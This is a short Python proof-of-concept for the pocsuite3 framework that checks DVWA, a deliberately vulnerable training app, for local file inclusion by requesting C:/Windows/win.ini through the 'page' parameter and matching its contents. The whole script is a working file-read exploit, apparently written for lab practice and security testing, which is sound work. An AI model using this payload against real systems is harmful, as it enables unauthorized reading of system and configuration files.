# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Local File Inclusion'
    vulType = VUL_TYPE.CODE_EXECUTION

    def _verify(self):
        result = {}
        # 路径识别
        if "/fi/" in self.url.lower():
            # 针对 Windows 虚拟机的绝对路径
            payload = "C:/Windows/win.ini"
            self.set_payload(payload)

            try:
                # 显式补全 index.php
                target = self.url.rstrip('/') + "/index.php"
                res = requests.get(target, params={'page': payload}, timeout=10)

                # 判定特征
                if "[extensions]" in res.text or "[fonts]" in res.text:
                    result['VerifyInfo'] = {"URL": target, "Payload": payload}
            except:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(POC)